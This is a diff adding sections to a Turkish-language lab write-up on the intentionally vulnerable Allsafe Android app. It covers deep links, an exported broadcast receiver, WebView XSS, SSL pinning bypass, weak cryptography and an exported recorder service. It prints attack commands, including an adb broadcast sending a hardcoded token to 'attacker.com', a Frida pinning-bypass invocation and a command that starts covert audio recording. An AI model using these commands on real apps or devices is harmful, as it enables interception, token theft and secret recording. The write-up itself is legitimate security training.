@@ -287,3 +287,524 @@ Görüldüğü üzere root detection mekanizmasını bypass etmeyi başardık.
   [2]: https://miro.medium.com/v2/resize:fill:64:64/1*Inp_h8gYN02E5EXuWSU0tg.jpeg
   [3]: https://github.com/t0thkr1s/allsafe-android/releases/download/v1.5/allsafe.apk
   [4]: https://sourceforge.net/projects/jadx.mirror/
+
+## Zafiyet Adı : Deep Link Exploitation
+
+**Zafiyet Tanımı** : Deep Link Exploitation zafiyeti, mobil uygulamalarda kullanılan derin bağlantı (deep link) mekanizmasının güvenli şekilde doğrulanmaması sonucu ortaya çıkar. Deep linkler, belirli bir uygulama ekranına veya işlevine doğrudan yönlendirme yapmayı sağlar. Eğer uygulama, deep link ile gelen parametreleri veya çağrıları yeterli kimlik doğrulama ve yetkilendirme kontrolü olmadan işlerse, saldırgan özel hazırlanmış bir link aracılığıyla uygulamanın kritik fonksiyonlarına erişebilir. Bu durum, yetkisiz kullanıcıların hesap ayarlarını değiştirmesi, oturum açmadan yetkili ekranlara yönlenmesi veya hassas işlemleri tetiklemesi gibi güvenlik risklerine yol açar.
+
+**Zafiyet Derecesi** : **Yüksek**
+
+Deep linklerin sömürülmesi, uygulama içinde kimlik doğrulamayı atlamaya, hassas bilgilere yetkisiz erişim sağlamaya ve kritik fonksiyonların tetiklenmesine sebep olabileceği için yüksek riskli bir güvenlik açığıdır.
+
+Kaynak kodunu inceleyelim.
+
+    public class DeepLinkTask extends AppCompatActivity {
+        @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+        protected void onCreate(Bundle savedInstanceState) {
+            super.onCreate(savedInstanceState);
+            setContentView(R.layout.activity_deep_link_task);
+            Intent intent = getIntent();
+            String action = intent.getAction();
+            Uri data = intent.getData();
+            Log.d("ALLSAFE", "Action: " + action + " Data: " + data);
+            try {
+                if (data.getQueryParameter("key").equals(getString(R.string.key))) {
+                    findViewById(R.id.container).setVisibility(0);
+                    SnackUtil.INSTANCE.simpleMessage(this, "Good job, you did it!");
+                } else {
+                    SnackUtil.INSTANCE.simpleMessage(this, "Wrong key, try harder!");
+                }
+            } catch (Exception e) {
+                SnackUtil.INSTANCE.simpleMessage(this, "No key provided!");
+                Log.e("ALLSAFE", e.getMessage());
+            }
+        }
+    }
+
+if kod bloğunda görüldüğü üzere uygulama bir deep link ile açılıyor ve bir key URI(Intent data) içerisinden bir key sorgu parametresi alınıyor. Bu key sorgu parametresi strings.xml dosyasındaki key değerine eşit ise görev tamamlanıyor.
+
+Android uygulamalarındaki deeplinkleri test etmek için en çok kullanılan komutlardan biri `adb shell am start`'tır.
+
+    adb shell am start -W -a android.intent.action.VIEW -d "deeplink://parametre?query=key" com.hedef.uygulama
+
+- `adb shell am start` → Activity Manager üzerinden yeni bir intent başlatır.
+- `-W` → Komutun tamamlanmasını bekler.
+- `-a android.intent.action.VIEW` → Intent'in action kısmı (deeplink'ler için genelde VIEW).
+- `-d "deeplink://..."` → Deeplink URI'si (senaryoya göre buraya URL veya custom scheme yazılır).
+- `com.hedef.uygulama` → Hedef uygulamanın package adı.
+
+Şimdi deep link testi için kendi senaryomuza göre bu adb komutunu tamamlamamız gerekiyor. Bunun içinde AndroindManifest.xml dosyasındaki intent-filter bilgisine bakmamız gerekiyor.
+
+    
+                
+                    
+                    
+                    
+                    
+                
+
+Bulduğumuz bilgileri toparlayalım:
+
+- **scheme** → `allsafe`
+- **host** → `infosecadventures`
+- **pathPrefix** → `/congrats`
+- Package adı → `infosecadventures.allsafe` (senin daha önce kullandığın paket)
+- Key → `strings.xml` içinden aldığın `ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`
+
+
+
+    adb shell am start -W -a android.intent.action.VIEW -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c" infosecadventures.allsafe
+
+Bulduğumuz bilgilerle komutumuz şuna dönüşüyor.
+
+Press enter or click to view image in full size
+
+Komutumuzu çalıştırdıktan sonra şöyle bir çıktı alıyoruz.
+
+Ve görev tamamlandı.
+
+## Zafiyet Adı : Insecure Broadcast Receiver
+
+**Zafiyet Tanımı** : Insecure Broadcast Receiver zafiyeti, Android uygulamalarında kullanılan Broadcast Receiver bileşenlerinin uygun güvenlik kontrolleri olmadan tanımlanması veya dışarıya açık bırakılması durumunda ortaya çıkar. Eğer bir Broadcast Receiver `exported="true"` olarak işaretlenmiş ve herhangi bir yetkilendirme (`permission`) kontrolü uygulanmamışsa, diğer uygulamalar veya saldırganlar bu receiver'a kötü niyetli broadcast intent mesajları gönderebilir. Bu durum, uygulama içinde yetkisiz işlemlerin tetiklenmesine, hassas bilgilere erişilmesine veya uygulamanın beklenmedik şekilde davranmasına yol açabilir.
+
+**Zafiyet Derecesi** : **Yüksek**
+
+Şimdi AndroidManifest.xml dosyasındaki receiver tagını inceleyelim.
+
+    
+                
+                    
+                
+            
+
+- `android:exported="true"` → Bu receiver cihazdaki herhangi bir uygulamadan tetiklenebilir demek.
+- `permission` ile bir kısıtlama eklenmemiş → Yani gelen intent'in kimden geldiği kontrol edilmiyor.
+
+Şimdi kaynak kodunu inceleyelim.
+
+    public class NoteReceiver extends BroadcastReceiver {
+        @Override // android.content.BroadcastReceiver
+        public void onReceive(Context context, Intent intent) {
+            String server = intent.getStringExtra("server");
+            String note = intent.getStringExtra("note");
+            String notification_message = intent.getStringExtra("notification_message");
+            OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
+            HttpUrl httpUrl = new HttpUrl.Builder().scheme("http").host(server).addPathSegment("api").addPathSegment("v1").addPathSegment("note").addPathSegment("add").addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=").addQueryParameter("note", note).build();
+            Log.d("ALLSAFE", httpUrl.getUrl());
+            Request request = new Request.Builder().httpUrl.build();
+            okHttpClient.newCall(request).enqueue(new Callback(this) { // from class: infosecadventures.allsafe.challenges.NoteReceiver.1
+                @Override // okhttp3.Callback
+                public void onFailure(Call call, IOException e) {
+                    Log.d("ALLSAFE", e.getMessage());
+                }@Override // okhttp3.Callback
+                public void onResponse(Call call, Response response) throws IOException {
+                    Log.d("ALLSAFE", ((ResponseBody) Objects.requireNonNull(response.body())).string());
+                }
+            });
+            NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "ALLSAFE");
+            builder.setContentTitle("Notification from Allsafe");
+            builder.setContentText(notification_message);
+            builder.setSmallIcon(R.mipmap.ic_launcher_round);
+            builder.setAutoCancel(true);
+            builder.setChannelId("ALLSAFE");
+            Notification notification = builder.build();
+            NotificationManager notificationManager = (NotificationManager) context.getSystemService("notification");
+            NotificationChannel notificationChannel = new NotificationChannel("ALLSAFE", "ALLSAFE_NOTIFICATION", 4);
+            notificationManager.createNotificationChannel(notificationChannel);
+            notificationManager.notify(1, notification);
+        }
+    }
+
+Kodun şu satırlarında görüldüğü üzere :
+
+    String server = intent.getStringExtra("server");
+    String note = intent.getStringExtra("note");
+    String notification_message = intent.getStringExtra("notification_message");
+    OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
+    HttpUrl httpUrl = new HttpUrl.Builder()
+    .scheme("http")
+    .host(server)
+    .addPathSegment("api")
+    .addPathSegment("v1")
+    .addPathSegment("note")
+    .addPathSegment("add")
+    .addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=")
+    .addQueryParameter("note", note).build();
+
+Receiver, dışarıdan gelen değerleri herhangi bir doğrulama uygulamadan alıyor ve HTTP istek oluşturuyor.
+
+Yani saldırgan kendi belirlediği bir `server` adresine, kendi `note` verisini, sabit `auth_token` ile gönderebiliyor.
+
+    builder.setContentText(notification_message);
+
+Bu satırda da görüldüğü üzere saldırgan notification mesajı gösterebiliyor.
+
+    adb shell am broadcast -n infosecadventures.allsafe/.challenges.NoteReceiver -a infosecadventures.allsafe.action.PROCESS_NOTE --es server "attacker.com" --es note "hacked_by_me" --es notification_message "Hacked"
+
+Şimdi yukarıdaki komutu kullanarak bir intent gönderelim.
+
+## Zafiyet Adı : WebView Injection / XSS
+
+**Zafiyet Tanımı** : Uygulamada kullanılan `WebView` bileşeni, kullanıcı tarafından girilen veriyi herhangi bir doğrulama veya filtreleme olmaksızın `loadUrl()` ve `loadData()` metodları aracılığıyla işliyor. `loadUrl()` fonksiyonu kullanıcı tarafından sağlanan bir URL'yi doğrudan çalıştırırken, `loadData()` fonksiyonu girilen HTML/JavaScript kodunu işleyerek tarayıcı motorunda render ediyor. Ayrıca `setJavaScriptEnabled(true)` kullanılması, saldırganın zararlı JavaScript kodlarını çalıştırmasına imkân tanıyor. Bu durum, kötü niyetli bir kullanıcının uygulama içerisinde XSS saldırısı gerçekleştirmesine, zararlı web sayfalarına yönlendirme yapmasına veya uygulama içi verileri manipüle etmesine neden olabilir.
+
+**Zafiyet Derecesi** : Yüksek
+
+Kaynak kodu inceleyelim :
+
+    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
+            View view = inflater.inflate(R.layout.fragment_vulnerable_web_view, container, false);
+            final TextInputEditText payload = (TextInputEditText) view.findViewById(R.id.payload);
+            final WebView webView = (WebView) view.findViewById(R.id.webView);
+            webView.setWebViewClient(new WebViewClient());
+            WebSettings settings = webView.getSettings();
+            settings.setJavaScriptEnabled(true);
+            settings.setAllowFileAccess(true);
+            settings.setLoadWithOverviewMode(true);
+            settings.setSupportZoom(true);
+            view.findViewById(R.id.execute).setOnClickListener(new View.OnClickListener() { // from class: infosecadventures.allsafe.challenges.VulnerableWebView$$ExternalSyntheticLambda0
+                @Override // android.view.View.OnClickListener
+                public final void onClick(View view2) {
+                    VulnerableWebView.this.lambda$onCreateView$0(payload, webView, view2);
+                }
+            });
+            return view;
+        }/* JADX INFO: Access modifiers changed from: private */
+        public /* synthetic */ void lambda$onCreateView$0(TextInputEditText payload, WebView webView, View v) {
+            if (!((Editable) Objects.requireNonNull(payload.getText())).toString().isEmpty()) {
+                if (URLUtil.isValidUrl(((Editable) Objects.requireNonNull(payload.getText())).toString())) {
+                    webView.loadUrl(payload.getText().toString());
+                    return;
+                } else {
+                    webView.setWebChromeClient(new WebChromeClient());
+                    webView.loadData(payload.getText().toString(), "text/html", "UTF-8");
+                    return;
+                }
+            }
+            SnackUtil.INSTANCE.simpleMessage(requireActivity(), "No payload provided!");
+        }
+
+`webView.getSettings().setJavaScriptEnabled(true);` → JavaScript yürütülmesine izin veriliyor.
+
+`webView.loadUrl(payload.getText().toString());` → Kullanıcı tarafından girilen URL doğrudan yükleniyor.
+
+`webView.loadData(payload.getText().toString(), "text/html", "UTF-8");` → Kullanıcı girdisi filtrelenmeden HTML/JS olarak render ediliyor.
+
+**Olası Saldırı Senaryoları:**
+
+Kullanıcı zararlı bir payload girdiğinde `` gibi XSS payload'ları çalıştırabilir.
+
+Uygulama zararlı sitelere yönlendirilebilir (`loadUrl("http://evil.com")`).
+
+JavaScript ile uygulama içi veriler çalınabilir veya kullanıcı aldatılarak phishing saldırıları gerçekleştirilebilir.
+
+Zararlı javascript kodunu girince zafiyetin tetiklendiğini görüyoruz.
+
+    settings.setAllowFileAccess(true);
+
+Yukarıdaki kod satırı WebView içerisinden cihazdaki dosya sistemine erişime izin verir. Yani WebView, `file://` URI şemasıyla açılan yerel dosyalara erişebilir.
+
+    file:///etc/hosts
+
+Yukarıdaki payload ile hosts dosyasına bu şekilde erişim sağlayabiliyoruz.
+
+## Zafiyet Adı : Certificate Pinning Bypass or SSL Pinning Bypass
+
+**Zafiyet Tanımı** : Mobil uygulamada SSL/TLS sertifika doğrulaması için uygulanan Certificate Pinning mekanizması etkisiz hale getirilebilmektedir. Normal şartlarda certificate pinning, istemci ile sunucu arasındaki iletişimde yalnızca belirli bir sertifikaya güvenilmesini sağlar ve ortadaki adam (MitM) saldırılarını engeller. Ancak, uygulamada bu kontrolün atlatılabilmesi sonucunda, saldırgan tersine mühendislik, runtime hooking (Frida, Xposed) veya zayıf pinning implementasyonu kullanarak SSL trafiğini çözümleyebilir. Bu durum, uygulamanın güvenli iletişim mekanizmasını zayıflatır ve şifreli olması gereken verilerin (kullanıcı adı, parola, token, oturum bilgileri vb.) saldırgan tarafından ele geçirilmesine yol açar.
+
+**Zafiyet Derecesi** : Yüksek
+
+Resimde görüldüğü üzere butona bastığımızda isteğimiz HTTPS üzerinden güvenli bir şekilde gidiyor. Amacımız bu isteğin bizim üzerimizden gitmesi.
+
+Burp suite aracımızla sunucu ile istemci arasına girip isteği göndermeye çalıştığımız zaman bir sertifika problemi hatası alıyoruz. Araya girip sağlıklı bir şekilde istekleri görüp manipüle edebilmemiz için burada ssl pinning bypass yapmamız lazım. Bunu da frida aracımızı kullanarak yapacağız.
+
+Bunun için scripti kendim yazmayacağım. Onun yerine internetten script araştıracağım. Bu sayede sizde script yazmanın dışında internetteki kaynaklardan da script araştırıp onları deneyimleyerek bypass etmeyi öğreneceksiniz.
+
+[SSL Pinning Bypass scripti](https://codeshare.frida.re/@Q0120S/bypass-ssl-pinning/)
+
+Script Frida ile yükleniyor ve uygulamanın içinde aşağıdaki yerlere **hook** atıyor:
+- **Genel SSL Hataları**: `SSLPeerUnverifiedException` gibi hataları yakalayıp otomatik bypass ediyor.
+- **HttpsURLConnection**: `setSSLSocketFactory`, `setHostnameVerifier` gibi metotları etkisiz hale getiriyor.
+- **SSLContext** ve **TrustManager**: Uygulamanın güvenilir sertifika listesini boş/dummy trust manager ile değiştiriyor.
+- **Android TrustManagerImpl (7.0+)**: `checkTrustedRecursive`, `verifyChain` fonksiyonlarını bypass ediyor
+- **OkHTTP v3** : `CertificatePinner.check()` metodlarını override ediyor.
+
+Yukarıdaki linkini bıraktığım scripti deneyeceğim.
+
+Press enter or click to view image in full size
+
+Scripti yukarıdaki gibi çalıştırıyoruz.
+
+    frida --codeshare Q0120S/bypass-ssl-pinning -f YOUR_BINARY
+
+Scripti nasıl çalıştıracağınız aslında scriptin yayınlandığı sayfada yazıyor. Bu komuta -U parametresi ile YOUR_BINARY yazan yere zafiyetli mobil uygulamamızın paket adını yazmamız gerekiyor.
+
+Press enter or click to view image in full size
+
+Burp suite aracında da gördüğümüz gibi isteğimiz üzerimizden geçiyor.
+
+## Zafiyet Adı : Weak Cryptography
+
+**Zafiyet Tanımı** : Uygulama, hassas verileri şifrelemek ve bütünlüğünü sağlamak için güvensiz kriptografik yöntemler kullanmaktadır.
+- AES şifrelemesi ECB modu ile yapılmaktadır; bu mod veri blokları arasında öngörülebilirlik yaratır ve veri sızıntısına yol açabilir.
+- MD5 algoritması kullanılmaktadır; MD5 günümüzde kolayca çakışmalar üretilebilir ve kırılabilir, dolayısıyla güvenli değildir.
+- Sabit bir anahtar (`KEY = "1nf053c4dv3n7ur3"`) kullanılması, şifrelemenin tahmin edilebilir ve kolayca geri çözülebilir olmasına sebep olur.
+
+Bu durum, kullanıcıların gizli bilgilerini veya uygulama içi hassas verileri saldırganların ele geçirmesini kolaylaştırır.
+
+**Zafiyet Derecesi** : Yüksek
+
+    public static String encrypt(String value) {
+            try {
+                SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(StandardCharsets.UTF_8), "AES");
+                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
+                cipher.init(1, secretKeySpec);
+                byte[] encrypted = cipher.doFinal(value.getBytes());
+                return new String(encrypted);
+            } catch (InvalidKeyException | NoSuchAlgorithmException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e) {
+                e.printStackTrace();
+                return null;
+            }
+        }public static String md5Hash(String text) {
+            StringBuilder stringBuilder = new StringBuilder();
+            try {
+                MessageDigest digest = MessageDigest.getInstance("MD5");
+                digest.update(text.getBytes());
+                byte[] messageDigest = digest.digest();
+                stringBuilder.append(String.format("%032X", new BigInteger(1, messageDigest)));
+            } catch (Exception e) {
+                Log.d("ALLSAFE", e.getLocalizedMessage());
+            }
+            return stringBuilder.toString();
+        }
+
+Kodu incelediğimizde :
+
+    public static final String KEY = "1nf053c4dv3n7ur3";
+
+Anahtar sabit ve gömülü. Bu, herhangi birinin uygulama kodunu analiz ederek anahtarı elde edebileceği anlamına gelir.
+
+    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
+
+ECB (Electronic Codebook) modu **bloklar arasında korelasyon bırakır** ve aynı veri blokları aynı şifrelenmiş bloklara dönüşür. Veriler tahmin edilebilir ve görsel analizle (pattern detection) çözülmeye müsaittir. ECB modu modern güvenlik standartlarına göre önerilmez; **CBC veya GCM** gibi modlar kullanılmalıdır.
+
+    SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(StandardCharsets.UTF_8), "AES");
+    cipher.init(1, secretKeySpec);
+
+Her zaman aynı anahtar kullanılıyor. Anahtar yönetimi yapılmamış, random veya dinamik anahtar yok. Bir kez anahtar ele geçirilirse tüm şifreli veriler çözülebilir.
+
+    MessageDigest digest = MessageDigest.getInstance("MD5");
+
+MD5 artık kriptografik olarak güvenli bir hash algoritması değildir; çakışmalar (collision) üretmek kolaydır.
+
+Android uygulamasının kullandığı Java Cryptography Extension (JCE) sınıflarına hook atan bir [script](https://codeshare.frida.re/@fadeevab/intercept-android-apk-crypto-operations/) buldum. Yani uygulamanın şifreleme (crypto) işlemleri sırasında kullanılan anahtarları ve verileri görünür hale getiriyor.
+
+Press enter or click to view image in full size
+
+Önce scriptimizi çalıştıralım.
+
+Ardından uygulamada test yazıp "ENCRYPT" tuşuna basalım.
+
+Press enter or click to view image in full size
+
+Gördüğünüz üzere konsola geri dönüp tekrar baktığımızda şifrelemek istediğimiz veri ve anahtarı yakaladık.
+
+    KEY: 316e6630353363346476336e37757233 | 1nf053c4dv3n7ur3
+    CIPHER: AES/ECB/PKCS5PADDING
+    Gotcha!
+    test
+
+KEY: 316e6630353363346476336e37757233
+
+Bu kısım AES şifrelemesinde kullanılan anahtar.
+
+Hexadecimal (16'lık) formatta yazılmış.
+
+ASCII'ye çevirdiğinde şu string çıkıyor: 1nf053c4dv3n7ur3
+
+Yani aslında key hem hex hem de string formatında verilmiş.
+
+CIPHER: AES/ECB/PKCS5PADDING
+
+Bu şifreleme işleminin hangi algoritma ile yapıldığını gösteriyor.
+
+AES → Advanced Encryption Standard.
+
+ECB → Electronic Codebook Mode (blokların birbirinden bağımsız şifrelenmesi; güvenlik açısından pek önerilmez).
+
+PKCS5Padding → Şifreleme öncesi veriye padding (doldurma) yapılması.
+
+Yani mesaj AES ile, ECB modunda ve PKCS5 padding kullanılarak şifreleniyor.
+
+## Zafiyet Adı : Insecure Service
+
+**Zafiyet Tanımı** : Android uygulamaları, bazı servislerini diğer uygulamalara açık bir şekilde sunabilir. Bu durum, `exported` özelliği yanlış yapılandırılmış servisler veya gereksiz izinlerle birlikte kullanıldığında saldırganların uygulamanın işlevlerine yetkisiz erişim sağlamasına olanak tanır. Bu zafiyet, hassas verilerin sızmasına, uygulama davranışının değiştirilmesine veya arka planda yetkisiz işlemlerin yürütülmesine yol açabilir. Özellikle servisler, `Intent` tabanlı iletişim ile tetiklenebiliyorsa, kötü niyetli uygulamalar tarafından kolayca manipüle edilebilir.
+
+**Zafiyet Derecesi** : Yüksek
+
+    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
+            View view = inflater.inflate(R.layout.fragment_insecure_service, container, false);
+            view.findViewById(R.id.start).setOnClickListener(new View.OnClickListener() { // from class: infosecadventures.allsafe.challenges.InsecureService$$ExternalSyntheticLambda0
+                @Override // android.view.View.OnClickListener
+                public final void onClick(View view2) {
+                    InsecureService.this.lambda$onCreateView$0(view2);
+                }
+            });
+            return view;
+        }/* JADX INFO: Access modifiers changed from: private */
+        public /* synthetic */ void lambda$onCreateView$0(View v) {
+            if (ActivityCompat.checkSelfPermission(requireActivity(), "android.permission.RECORD_AUDIO") != 0 && ActivityCompat.checkSelfPermission(requireActivity(), "android.permission.READ_EXTERNAL_STORAGE") != 0 && ActivityCompat.checkSelfPermission(requireActivity(), "android.permission.WRITE_EXTERNAL_STORAGE") != 0) {
+                ActivityCompat.requestPermissions(requireActivity(), new String[]{"android.permission.RECORD_AUDIO", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"}, 0);
+            } else {
+                requireActivity().startService(new Intent(requireActivity(), (Class) RecorderService.class));
+            }
+        }
+
+Kaynak kodu baktığımızda :
+
+    requireActivity().startService(new Intent(requireActivity(), (Class) RecorderService.class));
+
+Bu satır, `RecorderService` isimli servisi başlatıyor. Sorun burada:
+
+1.  **Servisin güvenli şekilde sınırlanmaması**
+
+- `RecorderService` servisi `AndroidManifest.xml` dosyasında `exported="true"` veya hiç belirtilmemişse Android 12 ve alt sürümlerde varsayılan olarak başka uygulamalar tarafından başlatılabilir.
+- Yani başka bir uygulama, bu servisi kendi intent'ini kullanarak tetikleyebilir.
+
+1.  **Yetkisiz erişim riski**
+
+- `RecorderService` muhtemelen mikrofon ve dosya okuma/yazma izinleri gerektiriyor (RECORD_AUDIO, READ/WRITE_EXTERNAL_STORAGE).
+- Başka bir uygulama bu servisi çalıştırabilir ve kullanıcı haberi olmadan ses kaydı alabilir veya dosya yazabilir.
+
+1.  **İzin kontrolü eksikliği**
+
+- Kod, yalnızca kendi uygulamasındaki izinleri kontrol ediyor.
+- Servis başka bir uygulama tarafından çağrıldığında, servis içinde ek bir doğrulama yoksa (örn. `checkCallingPermission`) kötü niyetli bir uygulama tüm yetkilere erişebilir.
+
+Press enter or click to view image in full size
+
+Görüldüğü üzere RecorderService AndroidManifest.xml dosyasında exported="true" olarak ayarlanmış. Bu da bu servisi başka uygulamalar ile tetiklenebileceği anlamına geliyor.
+
+    public class RecorderService extends Service implements MediaRecorder.OnInfoListener {
+        private MediaRecorder mediaRecorder;@Override // android.app.Service
+        public void onCreate() {
+            super.onCreate();
+        }@Override // android.app.Service
+        public int onStartCommand(Intent intent, int flags, int startId) {
+            super.onStartCommand(intent, flags, startId);
+            startRecording();
+            return 1;
+        }@Override // android.app.Service
+        public IBinder onBind(Intent intent) {
+            return null;
+        }private void startRecording() {
+            Toast.makeText(this, "Audio recording started!", 0).show();
+            try {
+                this.mediaRecorder = new MediaRecorder();
+                this.mediaRecorder.setAudioSource(1);
+                this.mediaRecorder.setMaxDuration(10000);
+                this.mediaRecorder.setOutputFormat(2);
+                this.mediaRecorder.setAudioEncoder(3);
+                this.mediaRecorder.setAudioEncodingBitRate(64000);
+                this.mediaRecorder.setAudioSamplingRate(16000);
+                File outputFile = getOutputFile();
+                this.mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
+                this.mediaRecorder.prepare();
+                this.mediaRecorder.start();
+            } catch (Exception e) {
+                Log.d("ALLSAFE", "Exception: " + e.getMessage());
+            }
+        }private void stopRecording() {
+            try {
+                if (this.mediaRecorder != null) {
+                    this.mediaRecorder.stop();
+                    this.mediaRecorder.reset();
+                    this.mediaRecorder.release();
+                    this.mediaRecorder = null;
+                }
+                stopSelf();
+            } catch (Exception e) {
+                Log.d("ALLSAFE", "Exception: " + e.getMessage());
+            }
+            Toast.makeText(getApplicationContext(), "Audio recording stopped!", 0).show();
+        }private File getOutputFile() {
+            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US);
+            String fullPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + "/allsafe_rec_" + dateFormat.format(new Date()) + ".mp3";
+            Toast.makeText(getApplicationContext(), "File: " + fullPath, 0).show();
+            return new File(fullPath);
+        }@Override // android.media.MediaRecorder.OnInfoListener
+        public void onInfo(MediaRecorder mr, int what, int extra) {
+            stopRecording();
+        }@Override // android.app.Service
+        public void onDestroy() {
+            super.onDestroy();
+            stopRecording();
+        }
+    }
+
+Yukarıda RecorderService sınıfına ait kodları görüyoruz.
+
+Şimdi bu kodları inceleyelim.
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        super.onStartCommand(intent, flags, startId);
+        startRecording();
+        return 1;
+    }
+
+Burada servis doğrudan başlatılıyor ve `startRecording()` çağrılıyor.
+
+`Intent` üzerinden gelen bilgiyi veya çağrı yapan uygulamayı kontrol etmiyor.
+
+Eğer servis `exported="true"` ise, başka bir uygulama kötü niyetli olarak bu servisi başlatıp arbitrary (rastgele) kayıt yapabilir.
+
+    private void startRecording() {
+        Toast.makeText(this, "Audio recording started!", 0).show();
+        try {
+            this.mediaRecorder = new MediaRecorder();
+            this.mediaRecorder.setAudioSource(1);
+            this.mediaRecorder.setMaxDuration(10000);
+            this.mediaRecorder.setOutputFormat(2);
+            this.mediaRecorder.setAudioEncoder(3);
+            this.mediaRecorder.setAudioEncodingBitRate(64000);
+            this.mediaRecorder.setAudioSamplingRate(16000);
+            File outputFile = getOutputFile();
+            this.mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
+            this.mediaRecorder.prepare();
+            this.mediaRecorder.start();
+        } catch (Exception e) {
+            Log.d("ALLSAFE", "Exception: " + e.getMessage());
+        }
+    }
+
+Yetkisiz kayıt riski**:** Servis başka bir uygulama tarafından tetiklenirse, kullanıcı haberi olmadan mikrofon kaydı başlatılır.
+
+İzin kontrolü eksikliği**:** `ActivityCompat.checkSelfPermission()` sadece activity'de kontrol edilmişti, servis içinde ek bir izin doğrulaması yok.
+
+Dosya yolu hassasiyeti**:**
+
+    File outputFile = getOutputFile(); 
+    this.mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
+
+Dosya, `Downloads` klasörüne yazılıyor ve başka uygulamalar tarafından okunabilir.
+
+Hassas ses kayıtları dışarı sızabilir.
+
+    private File getOutputFile() {
+        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US);
+        String fullPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+            .getAbsolutePath() + "/allsafe_rec_" + dateFormat.format(new Date()) + ".mp3";
+        Toast.makeText(getApplicationContext(), "File: " + fullPath, 0).show();
+        return new File(fullPath);
+    }
+
+Dosya dışa açık**:** `Environment.getExternalStoragePublicDirectory` herkesin erişebileceği bir yol.
+
+Hassas veriler (mikrofon kayıtları) cihazdaki diğer uygulamalar tarafından okunabilir veya silinebilir.
+
+    adb shell am startservice infosecadventures.allsafe/.challenges.RecorderService
+
+Yukarıdaki komut ile RecorderService'ini uygulamayı açmadan başlatır ve ses kaydı yapabiliriz.
+
+
+
